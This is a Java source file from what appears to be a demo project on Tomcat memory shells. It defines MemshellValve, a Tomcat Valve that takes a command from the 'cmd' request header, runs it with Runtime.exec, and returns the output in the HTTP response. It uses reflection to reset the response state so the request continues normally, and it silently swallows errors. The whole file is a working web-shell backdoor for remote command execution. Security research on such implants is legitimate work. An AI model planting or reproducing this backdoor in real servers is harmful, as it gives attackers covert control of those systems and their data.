package com.example.tomcatmemshell.demos.web.addvalve;

import java.io.*;
import java.lang.reflect.Field;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;


public class MemshellValve extends ValveBase {
    public void invoke(Request request, Response response) throws IOException, ServletException {

        HttpServletRequest req = request;
        String cmd = req.getHeader("cmd");
        if (cmd != null){
            try {
                Process p=Runtime.getRuntime().exec(cmd);
                InputStream inputStream = p.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;


                PrintWriter writer = request.getResponse().getWriter();
                while ((line = reader.readLine()) != null) {
                    writer.println(line);

                }
                writer.flush();
                Field useF = request.getResponse().getClass().getDeclaredField("usingWriter");
                useF.setAccessible(true);
                useF.set(request.getResponse(),false);

                Field useF2 = request.getResponse().getClass().getDeclaredField("usingOutputStream");
                useF2.setAccessible(true);
                useF2.set(request.getResponse(),false);

                p.waitFor();

            } catch (Exception e) {

            }
        }
        getNext().invoke(request, response);
    }
}